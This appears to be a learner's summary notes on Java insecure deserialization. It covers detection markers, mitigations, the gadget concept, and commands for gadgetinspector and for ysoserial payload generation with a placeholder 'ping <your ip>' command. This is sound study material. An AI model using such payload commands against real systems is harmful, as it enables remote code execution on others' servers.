# WhySoJava_1
![img](https://user-images.githubusercontent.com/44260690/187186386-ecda9b10-9749-47a5-9e91-a9790b4667f8.png)

Summary (KeyNotes)

1. What is java serialization/deserialization ? Just the concept, no details, in your own words
- a way to represent object as a piece of bytes

2. How to spot java serialized object: 
- .ser extention
- starting bytes 'aced 0005'
- base64 encoded starting bytes 'RO0AB'

3. How to mitigate insecure deserialization ?
- if its not necessary: avoid it
- know your frameworks and configure them accordingly to the recommendations
- it its necessary whitelist what objects can be deserialized

4. What is a gadget ? just the concept, no details, in your own words
- piece of code which can be used to achieve rce via java deserialization

5. How to scan for uncommon gadgetchain using gadgetinspector ?
`java -Xmx2G -jar build/libs/gadget-inspector-all.jar commons-collections-3.2.1.jar`
results inside: gadget-chains.txt

6. How to generate payload using ysoserial ? 
normal (bytes):
java -jar ysoserial-master-30099844c6-1.jar <Gadget> "ping <your ip>" > payload
base64 encoded:
java -jar ysoserial-master-30099844c6-1.jar <Gadget> "ping <your ip>" | base64 > payload.txt

7. How to autonomate payload generation ?
 
github.com/ElusiveFoxie/Python-Bash_Deserialisation/

burp useful plugin:
https://portswigger.net/bappstore/228336544ebe4e68824b5146dbbd93ae
